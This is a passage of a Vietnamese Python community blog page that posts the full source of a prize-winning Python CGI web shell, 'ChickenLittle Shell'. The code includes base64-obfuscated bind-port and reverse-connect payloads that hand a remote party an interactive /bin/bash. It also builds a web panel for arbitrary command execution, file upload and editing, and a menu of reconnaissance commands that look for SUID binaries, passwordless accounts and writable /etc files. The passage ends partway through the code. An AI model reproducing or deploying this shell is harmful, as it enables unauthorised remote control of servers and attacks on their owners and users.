<!DOCTYPE html>
<html lang="vi">
  <head>
    <meta charset="utf-8"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>  ChickenLittle Shell
 | Python Cho Người Việt</title>

    <meta name="author" content="Nhóm PCNV"/>

    <!-- Bootstrap -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css"/>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"/>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/magnific-popup.min.css"/>
    <link rel="stylesheet" href="../../theme/css/jquery.mglass.css"/>
    <link rel="stylesheet" href="../../theme/css/pygment-solarized-dark.css"/>
    <link rel="stylesheet" href="../../theme/css/style.css"/>

    <!-- Fonts -->
    <link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'/>
    <link href='https://fonts.googleapis.com/css?family=Istok+Web' rel='stylesheet' type='text/css'/>
    <link href='https://fonts.googleapis.com/css?family=Droid+Sans+Mono' rel='stylesheet' type='text/css'/>


    <link rel="icon" href="../../favicon.ico" type="image/x-icon">
    <link rel="shortcut icon" href="../../favicon.ico" type="image/x-icon">

    <!-- Feeds -->


  </head>

  <body>

    <div class="container">

      <div class="page-header">
          <a href="../.." class="container pull-left">
            <div class="">
              <div class="side"><img src="../../logo.png" class="img-responsive"/></div>
            </div>
          </a>
        <h1><a href="../..">Python Cho Người Việt</a> <small></small></h1>
      </div>

      <nav class="navbar navbar-default">

        <!-- Hamburger menu for mobile -->
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#plumage-navbar-collapse-1" aria-expanded="false">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="../.." title="">Python Cho Người Việt</a>
        </div>

        <!-- Menus and search forms -->
        <div class="collapse navbar-collapse" id="plumage-navbar-collapse-1">

          <ul class="nav navbar-nav">
<li >
                <a href="../../static/tutorial/2.5/tut.html">Bài chỉ dẫn 2.5</a>
              </li>
<li >
                <a href="../../category/tin-tuc.html">Tin tức</a>
              </li>
<li >
                <a href="../../category/bai-viet.html">Bài viết</a>
              </li>
<li >
                <a href="http://forum.vithon.org">Diễn đàn</a>
              </li>
<li >
                  <a href="../../page/about.html">Giới thiệu</a>
                </li>
          </ul>


            <form class="navbar-form navbar-right" role="search" action="../../search.html" onsubmit="return validateForm(this.elements['q'].value);">
              <div class="form-group">
                <div class="input-group">
                  <input type="text" name="q" id="tipue_search_input" class="form-control search-query" placeholder="Search" required />
                  <span class="input-group-btn">
                    <button class="btn btn-default" type="submit"><i class="fa
                        fa-search fa-fw"></i></button>
                  </span>
                </div>
              </div>
            </form>

        </div>

      </nav>

    </div>


    <div class="container main">


      <div class="row">
        <div class=" col-md-9  ">
  <h1>
    <a href="../../2010/05/chickenlittle-shell.html" rel="bookmark" title="Permalink to ChickenLittle Shell">ChickenLittle Shell</a>
  </h1>
        </div>
      </div>

      <div class="row">


        <div class=" col-md-9 " id="content" role="main">
  

  <div>
    <p>Nhân dịp kỷ niệm 120 năm ngày sinh lãnh tụ Hồ Chí Minh, nhóm PCNV xin gửi đến bạn đọc bài dự thi đạt giải nhất cuộc thi Web Shell Programming Contest kết thúc vào ngày 15 tháng 05 vừa qua.</p>
<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="sd">ChickenLittle Shell by Zep</span>
<span class="sd">&quot;&quot;&quot;</span>

<span class="k">try</span><span class="p">:</span>
    <span class="kn">import</span> <span class="nn">cgitb</span><span class="p">;</span> <span class="n">cgitb</span><span class="o">.</span><span class="n">enable</span><span class="p">()</span>
<span class="k">except</span><span class="p">:</span>
    <span class="k">pass</span>
<span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">cgi</span><span class="o">,</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">base64</span><span class="o">,</span> <span class="nn">subprocess</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">strftime</span>
<span class="kn">from</span> <span class="nn">string</span> <span class="kn">import</span> <span class="n">Template</span>

<span class="n">bind_port</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;aW1wb3J0IG9zLCBzeXMsIHNvY2tldCwgdGltZQpQT1JUID0gaW50KHN5cy5hcmd2WzFdKQpQVyA9</span>
<span class="s2">IHN5cy5hcmd2WzJdCnNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5T</span>
<span class="s2">T0NLX1NUUkVBTSkKc29jay5iaW5kKCgiMC4wLjAuMCIsUE9SVCkpCnNvY2subGlzdGVuKDUpClNI</span>
<span class="s2">RUxMPSIvYmluL2Jhc2ggLWkiCndoaWxlIFRydWU6CiAgICB0cnk6CQogICAgICAgIChjb25uLGFk</span>
<span class="s2">ZHIpID0gc29jay5hY2NlcHQoKQogICAgICAgIG9zLmR1cDIoY29ubi5maWxlbm8oKSwwKQogICAg</span>
<span class="s2">ICAgIG9zLmR1cDIoY29ubi5maWxlbm8oKSwxKQogICAgICAgIG9zLmR1cDIoY29ubi5maWxlbm8o</span>
<span class="s2">KSwyKQogICAgICAgIHByaW50ID4+IHN5cy5zdGRlcnIsICdQYXNzd29yZDogJywKICAgICAgICBw</span>
<span class="s2">ID0gY29ubi5yZWN2KDEwMjQpCiAgICAgICAgcCA9IHAuc3RyaXAoKQogICAgICAgIGlmIHAgPT0g</span>
<span class="s2">UFc6CiAgICAgICAgICAgIG9zLnN5c3RlbSgiL2Jpbi9iYXNoIC1pIikKICAgICAgICBlbHNlOgog</span>
<span class="s2">ICAgICAgICAgICBwcmludCA+PiBzeXMuc3RkZXJyLCAiR28gdG8gaGVsbCIKICAgICAgICBjb25u</span>
<span class="s2">LmNsb3NlKCkKICAgIGV4Y2VwdCBFeGNlcHRpb24sZTogIAogICAgICAgIHByaW50IGUKICAgICAg</span>
<span class="s2">ICB0aW1lLnNsZWVwKDEpCg==&quot;&quot;&quot;</span>

<span class="n">back_connect</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;aW1wb3J0IHNvY2tldCwgb3MsIHN5cwpIT1NUID0gc3lzLmFyZ3ZbMV0KUE9SVCA9IGludChzeXMu</span>
<span class="s2">YXJndlsyXSkKU0hFTEwgPSAiL2Jpbi9iYXNoIC1pIgpzb2NrID0gc29ja2V0LnNvY2tldChzb2Nr</span>
<span class="s2">ZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnNvY2suY29ubmVjdCgoSE9TVCxQT1JUKSkK</span>
<span class="s2">dHJ5OgogICAgb3MuZHVwMihzb2NrLmZpbGVubygpLCAwKQogICAgb3MuZHVwMihzb2NrLmZpbGVu</span>
<span class="s2">bygpLCAxKQogICAgb3MuZHVwMihzb2NrLmZpbGVubygpLCAyKQogICAgb3Muc3lzdGVtKFNIRUxM</span>
<span class="s2">KQpleGNlcHQgRXhjZXB0aW9uLGU6CiAgICBwcmludCBlCnNvY2suY2xvc2UoKQo=&quot;&quot;&quot;</span>

<span class="c1"># HTML</span>

<span class="n">html</span> <span class="o">=</span> <span class="n">Template</span><span class="p">(</span><span class="s2">&quot;&quot;&quot;</span>
<span class="s2">&lt;html&gt;</span>
<span class="s2">&lt;head&gt;</span>
<span class="s2">    &lt;title&gt;ChickenLittle Shell&lt;/title&gt;</span>
<span class="s2">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;</span>
<span class="s2">    &lt;style&gt;</span>
<span class="s2">        body {</span>
<span class="s2">            color:#fff;</span>
<span class="s2">            background-color:#585858;</span>
<span class="s2">            font-size:11px;</span>
<span class="s2">        }</span>
<span class="s2">        table {</span>
<span class="s2">            font-family: Verdana, Tahoma;</span>
<span class="s2">            font-size:11px;</span>
<span class="s2">        }</span>
<span class="s2">        tr {</span>
<span class="s2">            border: #D9D9D9 1px solid;</span>
<span class="s2">        }</span>
<span class="s2">        td {</span>
<span class="s2">            border: #D9D9D9 1px solid;</span>
<span class="s2">        }</span>
<span class="s2">        a {</span>
<span class="s2">            color: #fff;</span>
<span class="s2">        }</span>
<span class="s2">        input {</span>
<span class="s2">            background-color:#800000;</span>
<span class="s2">            color:#FFFFFF;</span>
<span class="s2">            font-family:Tahoma;</span>
<span class="s2">            font-size:8pt;</span>
<span class="s2">        }</span>
<span class="s2">        select {</span>
<span class="s2">            background-color:#800000;</span>
<span class="s2">            color:#FFFFFF;</span>
<span class="s2">            font-family:Tahoma;</span>
<span class="s2">            font-size:8pt;</span>
<span class="s2">        }</span>
<span class="s2">        textarea {</span>
<span class="s2">            background-color:#800000;</span>
<span class="s2">            color:#FFFFFF;</span>
<span class="s2">            font-family:Tahoma;</span>
<span class="s2">            font-size:8pt;</span>
<span class="s2">        }</span>
<span class="s2">    &lt;/style&gt;</span>
<span class="s2">&lt;/head&gt;</span>
<span class="s2">&lt;body&gt;</span>
<span class="s2">    &lt;script type=&quot;text/javascript&quot;&gt;</span>
<span class="s2">        function toggleEnviron()</span>
<span class="s2">        {</span>
<span class="s2">            if (document.getElementById(&#39;environ_table&#39;).style.display==&quot;none&quot;)</span>
<span class="s2">                document.getElementById(&#39;environ_table&#39;).style.display=&quot;&quot;;</span>
<span class="s2">            else</span>
<span class="s2">                document.getElementById(&#39;environ_table&#39;).style.display=&quot;none&quot;;</span>
<span class="s2">        }</span>
<span class="s2">    &lt;/script&gt;</span>
<span class="s2">    &lt;center&gt;&lt;h2&gt;=== ChickenLittle Shell ===&lt;/h2&gt;&lt;/center&gt;</span>
<span class="s2">    &lt;a href=&quot;javascript:void(0)&quot; onclick=&quot;javascript:toggleEnviron()&quot;&gt;Show/Hide Environment variables&lt;/a&gt;</span>
<span class="s2">    $environ_table</span>
<span class="s2">    &lt;p /&gt;</span>
<span class="s2">    &lt;table width=&quot;100%&quot;&gt;</span>
<span class="s2">        &lt;tr&gt;&lt;td&gt;</span>
<span class="s2">            uname -a: $uname &lt;br /&gt;</span>
<span class="s2">            $uid</span>
<span class="s2">        &lt;/td&gt;&lt;/tr&gt;</span>
<span class="s2">    &lt;/table&gt;</span>
<span class="s2">    &lt;p /&gt;</span>
<span class="s2">    &lt;div style=&quot;display:$edit_file_box_visibility&quot;&gt;</span>
<span class="s2">        &lt;b&gt;Edit File:&lt;/b&gt; &lt;br /&gt;</span>
<span class="s2">        &lt;form method=&quot;POST&quot; action=&quot;?&quot;&gt;</span>
<span class="s2">            &lt;textarea name=&quot;file_content&quot; cols=&quot;200&quot; rows=&quot;30&quot; &gt;$file_content&lt;/textarea&gt;</span>
<span class="s2">            &lt;input type=&quot;hidden&quot; value=&quot;$cur_dir&quot; size=&quot;50&quot; name=&quot;cur_dir&quot; /&gt; &lt;br /&gt;</span>
<span class="s2">            &lt;input type=&quot;hidden&quot; value=&quot;save_file&quot; size=&quot;50&quot; name=&quot;command&quot; /&gt; &lt;br /&gt;</span>
<span class="s2">            &lt;input type=&quot;hidden&quot; value=&quot;$file_name&quot; size=&quot;50&quot; name=&quot;file_name&quot; /&gt; &lt;br /&gt;</span>
<span class="s2">            &lt;input type=&quot;submit&quot; value=&quot;Save&quot;&gt;</span>
<span class="s2">        &lt;/form&gt;</span>
<span class="s2">        &lt;p /&gt;</span>
<span class="s2">    &lt;/div&gt;</span>
<span class="s2">    &lt;table width=&quot;100%&quot;&gt;</span>
<span class="s2">        &lt;tr&gt;</span>
<span class="s2">            &lt;td style=&quot;text-align:center&quot;&gt;</span>
<span class="s2">                &lt;b&gt;:: Change Dir ::&lt;/b&gt;&lt;br /&gt;</span>
<span class="s2">                &lt;form action=&quot;?&quot; method=&quot;POST&quot;&gt;</span>
<span class="s2">                    &lt;input type=&quot;text&quot; value=&quot;$cur_dir&quot; size=&quot;50&quot; name=&quot;cur_dir&quot;&gt;&amp;nbsp;&lt;input type=&quot;submit&quot; value=&quot;Go&quot;&gt;</span>
<span class="s2">                &lt;/form&gt;</span>
<span class="s2">            &lt;/td&gt;</span>
<span class="s2">            &lt;td style=&quot;text-align:center&quot;&gt;</span>
<span class="s2">                &lt;b&gt;:: Get File ::&lt;/b&gt;&lt;br /&gt;</span>
<span class="s2">                &lt;form action=&quot;?&quot; method=&quot;POST&quot;&gt;</span>
<span class="s2">                    &lt;input type=&quot;text&quot; value=&quot;$cur_dir&quot; size=&quot;50&quot; name=&quot;cur_dir&quot;&gt;&amp;nbsp;&lt;input type=&quot;submit&quot; value=&quot;Go&quot;&gt;</span>
<span class="s2">                &lt;/form&gt;</span>
<span class="s2">            &lt;/td&gt;</span>
<span class="s2">        &lt;/tr&gt;</span>
<span class="s2">    &lt;/table&gt;</span>
<span class="s2">    &lt;p /&gt;</span>
<span class="s2">    &lt;table width=&quot;100%&quot;&gt;</span>
<span class="s2">        &lt;tr&gt;</span>
<span class="s2">            &lt;td colspan=&quot;2&quot; style=&quot;text-align:center&quot;&gt;&lt;b&gt;$cur_dir&lt;/b&gt;&lt;/td&gt;</span>
<span class="s2">        &lt;/tr&gt;</span>
<span class="s2">        &lt;tr&gt;</span>
<span class="s2">            &lt;td&gt;&lt;pre&gt;$list_files&lt;/pre&gt;&lt;/td&gt;</span>
<span class="s2">        &lt;/tr&gt;</span>
<span class="s2">    &lt;/table&gt;</span>
<span class="s2">    &lt;p /&gt;</span>
<span class="s2">    &lt;b&gt;Result of command&lt;/b&gt;&lt;br /&gt;</span>
<span class="s2">    &lt;table width=&quot;100%&quot;&gt;</span>
<span class="s2">        &lt;tr&gt;</span>
<span class="s2">            &lt;td&gt;</span>
<span class="s2">                &lt;textarea cols=&quot;200&quot; rows=&quot;10&quot;&gt;$command_result&lt;/textarea&gt;</span>
<span class="s2">            &lt;/td&gt;</span>
<span class="s2">        &lt;/tr&gt;</span>
<span class="s2">    &lt;/table&gt;</span>
<span class="s2">    &lt;table width=&quot;100%&quot;&gt;</span>
<span class="s2">        &lt;tr&gt;</span>
<span class="s2">            &lt;td style=&quot;text-align:center&quot; width=&quot;50%&quot;&gt;</span>
<span class="s2">                &lt;b&gt;:: Execute Command ::&lt;/b&gt;&lt;br /&gt;</span>
<span class="s2">                &lt;form action=&quot;?&quot; method=&quot;POST&quot;&gt;</span>
<span class="s2">                    &lt;input type=&quot;hidden&quot; value=&quot;$cur_dir&quot; size=&quot;50&quot; name=&quot;cur_dir&quot; /&gt;</span>
<span class="s2">                    &lt;input type=&quot;text&quot; value=&quot;&quot; size=&quot;50&quot; name=&quot;command&quot;&gt;&amp;nbsp;&lt;input type=&quot;submit&quot; value=&quot;Execute&quot;&gt;</span>
<span class="s2">                &lt;/form&gt;</span>
<span class="s2">            &lt;/td&gt;</span>
<span class="s2">            &lt;td style=&quot;text-align:center&quot;&gt;</span>
<span class="s2">                &lt;b&gt;:: Useful Commands ::&lt;/b&gt;&lt;br /&gt;</span>
<span class="s2">                &lt;form action=&quot;?&quot; method=&quot;POST&quot;&gt;</span>
<span class="s2">                    &lt;select name=&quot;command&quot;&gt;</span>
<span class="s2">                        &lt;option value=&quot;uname -a&quot;&gt;Kernel version&lt;/option&gt;</span>
<span class="s2">                        &lt;option value=&quot;w&quot;&gt;Logged in users&lt;/option&gt;</span>
<span class="s2">                        &lt;option value=&quot;lastlog&quot;&gt;Last to connect&lt;/option&gt;</span>
<span class="s2">                        &lt;option value=&quot;find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2&gt; /dev/null&quot;&gt;Suid bins&lt;/option&gt;</span>
<span class="s2">                        &lt;option value=&quot;cut -d: -f1,2,3 /etc/passwd | grep ::&quot;&gt;USER WITHOUT PASSWORD!&lt;/option&gt;</span>
<span class="s2">                        &lt;option value=&quot;find /etc/ -type f -perm -o+w 2&gt; /dev/null&quot;&gt;Write in /etc/?&lt;/option&gt;</span>
<span class="s2">                        &lt;option value=&quot;which wget curl w3m lynx&quot;&gt;Downloaders?&lt;/option&gt;</span>
<span class="s2">                        &lt;option value=&quot;cat /proc/version /proc/cpuinfo&quot;&gt;CPUINFO&lt;/option&gt;</span>
<span class="s2">                        &lt;option value=&quot;netstat -atup | grep IST&quot;&gt;Open ports&lt;/option&gt;</span>
<span class="s2">                        &lt;option value=&quot;locate gcc&quot;&gt;gcc installed?&lt;/option&gt;</span>
<span class="s2">                    &lt;/select&gt;</span>
<span class="s2">                    &lt;input type=&quot;hidden&quot; value=&quot;$cur_dir&quot; size=&quot;50&quot; name=&quot;cur_dir&quot; /&gt;</span>
<span class="s2">                    &lt;input type=&quot;submit&quot; value=&quot;Go&quot; /&gt;</span>
<span class="s2">                &lt;/form&gt;</span>
<span class="s2">            &lt;/td&gt;</span>
<span class="s2">        &lt;/tr&gt;</span>
<span class="s2">    &lt;/table&gt;</span>
<span class="s2">    &lt;p /&gt;</span>
<span class="s2">    &lt;table width=&quot;100%&quot;&gt;</span>
<span class="s2">        &lt;tr&gt;</span>
<span class="s2">            &lt;td style=&quot;text-align:center&quot; width=&quot;50%&quot;&gt;</span>
<span class="s2">                &lt;b&gt;:: Create Dir ::&lt;/b&gt;&lt;br /&gt;</span>
<span class="s2">                &lt;form action=&quot;?&quot; method=&quot;POST&quot;&gt;</span>
<span class="s2">                    &lt;input type=&quot;text&quot; value=&quot;$cur_dir&quot; size=&quot;50&quot; name=&quot;new_dir&quot;&gt;&amp;nbsp;&lt;input type=&quot;submit&quot; value=&quot;Create&quot;&gt;</span>
<span class="s2">                    &lt;input type=&quot;hidden&quot; value=&quot;mkdir&quot; size=&quot;50&quot; name=&quot;command&quot; /&gt;</span>
<span class="s2">                    &lt;input type=&quot;hidden&quot; value=&quot;$cur_dir&quot; size=&quot;50&quot; name=&quot;cur_dir&quot;&gt;</span>
<span class="s2">                &lt;/form&gt;</span>
<span class="s2">            &lt;/td&gt;</span>
<span class="s2">            &lt;td style=&quot;text-align:center&quot;&gt;</span>
<span class="s2">                &lt;b&gt;:: Upload File ::&lt;/b&gt;&lt;br /&gt;</span>
<span class="s2">                &lt;form action=&quot;?&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span>
<span class="s2">                    &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;&amp;nbsp;&lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt;</span>
<span class="s2">                    &lt;input type=&quot;hidden&quot; value=&quot;upload&quot; size=&quot;50&quot; name=&quot;command&quot; /&gt;</span>
<span class="s2">                    &lt;input type=&quot;hidden&quot; value=&quot;$cur_dir&quot; size=&quot;50&quot; name=&quot;cur_dir&quot;&gt;</span>
<span class="s2">                &lt;/form&gt;</span>
<span class="s2">            &lt;/td&gt;</span>
<span class="s2">        &lt;/tr&gt;</span>
<span class="s2">    &lt;/table&gt;</span>
<span class="s2">    &lt;p /&gt;</span>
<span class="s2">    &lt;table width=&quot;100%&quot;&gt;</span>
<span class="s2">        &lt;tr&gt;</span>
<span class="s2">            &lt;td style=&quot;text-align:center&quot; width=&quot;50%&quot;&gt;</span>
<span class="s2">                &lt;b&gt;:: Search Text in Files ::&lt;/b&gt;&lt;br /&gt;</span>
<span class="s2">                &lt;form action=&quot;?&quot; method=&quot;POST&quot;&gt;</span>
<span class="s2">                    &lt;table width=&quot;100%&quot;&gt;</span>
<span class="s2">                        &lt;tr&gt;</span>
<span class="s2">                            &lt;td width=&quot;50%&quot; style=&quot;border:none;text-align:right&quot;&gt;Text: &lt;/td&gt;</span>
<span class="s2">                            &lt;td style=&quot;border:none&quot;&gt;&lt;input type=&quot;text&quot; value=&quot;&quot; size=&quot;30&quot; name=&quot;search_text&quot; /&gt;&lt;/td&gt;</span>
<span class="s2">                        &lt;/tr&gt;</span>
<span class="s2">                        &lt;tr&gt;</span>
<span class="s2">                             &lt;td width=&quot;50%&quot; style=&quot;border:none;text-align:right&quot;&gt;Directory: &lt;/td&gt;</span>
<span class="s2">                            &lt;td style=&quot;border:none&quot;&gt;&lt;input type=&quot;text&quot; value=&quot;$cur_dir&quot; size=&quot;30&quot; name=&quot;search_dir&quot; /&gt;&lt;/td&gt;</span>
<span class="s2">                        &lt;/tr&gt;</span>
<span class="s2">                        &lt;tr&gt;</span>
<span class="s2">                             &lt;td width=&quot;50%&quot; style=&quot;border:none;text-align:right&quot;&gt;Include File Pattern: &lt;/td&gt;</span>
<span class="s2">                            &lt;td style=&quot;border:none&quot;&gt;&lt;input type=&quot;text&quot; value=&quot;&quot; size=&quot;30&quot; name=&quot;include_pattern&quot; /&gt;&lt;/td&gt;</span>
<span class="s2">                        &lt;/tr&gt;</span>
<span class="s2">                        &lt;tr&gt;</span>
<span class="s2">                             &lt;td width=&quot;50%&quot; style=&quot;border:none;text-align:right&quot;&gt;Exclude File Pattern: &lt;/td&gt;</span>
<span class="s2">                            &lt;td style=&quot;border:none&quot;&gt;&lt;input type=&quot;text&quot; value=&quot;&quot; size=&quot;30&quot; name=&quot;exclude_pattern&quot; /&gt;&lt;/td&gt;</span>
<span class="s2">                        &lt;/tr&gt;</span>
<span class="s2">                    &lt;/table&gt;</span>
<span class="s2">                    &lt;input type=&quot;submit&quot; value=&quot;Search&quot;&gt;</span>
<span class="s2">                    &lt;input type=&quot;hidden&quot; value=&quot;search_text&quot; size=&quot;50&quot; name=&quot;command&quot; /&gt;</span>
<span class="s2">                    &lt;input type=&quot;hidden&quot; value=&quot;$cur_dir&quot; size=&quot;50&quot; name=&quot;cur_dir&quot;&gt;</span>
<span class="s2">                &lt;/form&gt;</span>
<span class="s2">            &lt;/td&gt;</span>
<span class="s2">            &lt;td style=&quot;text-align:center;vertical-align:top&quot;&gt;</span>
<span class="s2">                &lt;b&gt;:: Edit File ::&lt;/b&gt;&lt;br /&gt;</span>
<span class="s2">                &lt;form action=&quot;?&quot; method=&quot;POST&quot;&gt;</span>
<span class="s2">                    &lt;input type=&quot;hidden&quot; value=&quot;$cur_dir&quot; size=&quot;50&quot; name=&quot;cur_dir&quot; /&gt;</span>
<span class="s2">                    &lt;input type=&quot;hidden&quot; value=&quot;edit_file&quot; size=&quot;50&quot; name=&quot;command&quot;&gt;</span>
<span class="s2">                    &lt;input type=&quot;text&quot; value=&quot;$cur_dir&quot; size=&quot;50&quot; name=&quot;file_name&quot;&gt;</span>
<span class="s2">                    &amp;nbsp;&lt;input type=&quot;submit&quot; value=&quot;Edit&quot;&gt;</span>
<span class="s2">                &lt;/form&gt;</span>
<span class="s2">            &lt;/td&gt;</span>
<span class="s2">        &lt;/tr&gt;</span>
<span class="s2">    &lt;/table&gt;</span>
<span class="s2">    &lt;p /&gt;</span>
<span class="s2">    &lt;table width=&quot;100%&quot;&gt;</span>
<span class="s2">        &lt;tr&gt;</span>
<span class="s2">            &lt;td style=&quot;text-align:center&quot; width=&quot;50%&quot;&gt;</span>
<span class="s2">                &lt;b&gt;:: Bind port to /bin/bash ::&lt;/b&gt;&lt;br /&gt;</span>
<span class="s2">                &lt;form action=&quot;?&quot; method=&quot;POST&quot;&gt;</span>
<span class="s2">                    &lt;table width=&quot;100%&quot;&gt;</span>
<span class="s2">                        &lt;tr&gt;</span>
<span class="s2">                            &lt;td width=&quot;50%&quot; style=&quot;border:none;text-align:right&quot;&gt;Port: &lt;/td&gt;</span>
<span class="s2">                            &lt;td style=&quot;border:none&quot;&gt;&lt;input type=&quot;text&quot; value=&quot;&quot; size=&quot;10&quot; name=&quot;port&quot; /&gt;&lt;/td&gt;</span>
<span class="s2">                        &lt;/tr&gt;</span>
<span class="s2">                        &lt;tr&gt;</span>
<span class="s2">                            &lt;td style=&quot;border:none;text-align:right&quot;&gt;Password: &lt;/td&gt;</span>
<span class="s2">                            &lt;td style=&quot;border:none&quot;&gt;&lt;input type=&quot;text&quot; value=&quot;&quot; size=&quot;10&quot; name=&quot;password&quot; /&gt;&lt;/td&gt;</span>
<span class="s2">                        &lt;/tr&gt;</span>
<span class="s2">                    &lt;/table&gt;</span>
<span class="s2">                    &lt;input type=&quot;submit&quot; value=&quot;Bind&quot;&gt;</span>
<span class="s2">                    &lt;input type=&quot;hidden&quot; value=&quot;bind_port&quot; size=&quot;50&quot; name=&quot;command&quot; /&gt;</span>
<span class="s2">                    &lt;input type=&quot;hidden&quot; value=&quot;$cur_dir&quot; size=&quot;50&quot; name=&quot;cur_dir&quot;&gt;</span>
<span class="s2">                &lt;/form&gt;</span>
<span class="s2">            &lt;/td&gt;</span>
<span class="s2">            &lt;td style=&quot;text-align:center&quot; width=&quot;50%&quot;&gt;</span>
<span class="s2">                &lt;b&gt;:: back-connect ::&lt;/b&gt;&lt;br /&gt;</span>
<span class="s2">                &lt;form action=&quot;?&quot; method=&quot;POST&quot;&gt;</span>
<span class="s2">                    &lt;table width=&quot;100%&quot;&gt;</span>
<span class="s2">                        &lt;tr&gt;</span>
<span class="s2">                            &lt;td width=&quot;50%&quot; style=&quot;border:none;text-align:right&quot;&gt;IP: &lt;/td&gt;</span>
<span class="s2">                            &lt;td style=&quot;border:none&quot;&gt;&lt;input type=&quot;text&quot; value=&quot;&quot; size=&quot;10&quot; name=&quot;ip&quot; /&gt;&lt;/td&gt;</span>
<span class="s2">                        &lt;/tr&gt;</span>
<span class="s2">                        &lt;tr&gt;</span>
<span class="s2">                            &lt;td style=&quot;border:none;text-align:right&quot;&gt;Port: &lt;/td&gt;</span>
<span class="s2">                            &lt;td style=&quot;border:none&quot;&gt;&lt;input type=&quot;text&quot; value=&quot;&quot; size=&quot;10&quot; name=&quot;port&quot; /&gt;&lt;/td&gt;</span>
<span class="s2">                        &lt;/tr&gt;</span>
<span class="s2">                    &lt;/table&gt;</span>
<span class="s2">                    &lt;input type=&quot;submit&quot; value=&quot;Connect&quot;&gt;</span>
<span class="s2">                    &lt;input type=&quot;hidden&quot; value=&quot;back_connect&quot; size=&quot;50&quot; name=&quot;command&quot; /&gt;</span>
<span class="s2">                    &lt;input type=&quot;hidden&quot; value=&quot;$cur_dir&quot; size=&quot;50&quot; name=&quot;cur_dir&quot;&gt;</span>
<span class="s2">                &lt;/form&gt;</span>
<span class="s2">            &lt;/td&gt;</span>
<span class="s2">        &lt;/tr&gt;</span>
<span class="s2">    &lt;/table&gt;</span>
<span class="s2">    &lt;p /&gt;</span>
<span class="s2">    &lt;table width=&quot;100%&quot;&gt;</span>
<span class="s2">        &lt;tr&gt;</span>
<span class="s2">            &lt;td style=&quot;text-align:center&quot;&gt;&lt;b&gt;(.)(.) [ChickenLittle Shell by Zep] (.)(.)&lt;/b&gt;&lt;/td&gt;</span>
<span class="s2">        &lt;/tr&gt;</span>
<span class="s2">    &lt;/table&gt;</span>
<span class="s2">&lt;/body&gt;</span>
<span class="s2">&lt;/html&gt;</span>
<span class="s2">&quot;&quot;&quot;</span><span class="p">)</span>

<span class="n">scriptname</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>

<span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">has_key</span><span class="p">(</span><span class="s2">&quot;SCRIPT_NAME&quot;</span><span class="p">):</span>
    <span class="n">scriptname</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s2">&quot;SCRIPT_NAME&quot;</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">get_environ_table</span><span class="p">():</span>
    <span class="n">s</span> <span class="o">=</span> <span class="s2">&quot;&lt;table style=</span><span class="se">\&quot;</span><span class="s2">display:none</span><span class="se">\&quot;</span><span class="s2"> id=</span><span class="se">\&quot;</span><span class="s2">environ_table</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span>
    <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">:</span>
        <span class="n">s</span><span class="o">+=</span><span class="s2">&quot;&lt;tr&gt;&lt;td&gt;</span><span class="si">%s</span><span class="s2">&lt;/td&gt;&lt;td&gt;</span><span class="si">%s</span><span class="s2">&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="o">%</span><span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="n">k</span><span class="p">])</span>
    <span class="n">s</span><span class="o">+=</span><span class="s2">&quot;&lt;/table&gt;&quot;</span>
    <span class="k">return</span> <span class="n">s</span>

<span class="k">def</span> <span class="nf">run_command</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">STDOUT</span><span class="p">,</span> <span class="n">close_fds</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">o</span><span class="p">)</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">stdin</span><span class="p">,</span><span class="n">p</span><span class="o">.</span><span class="n">stdout</span>
    <span class="k">return</span> <span class="n">o</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

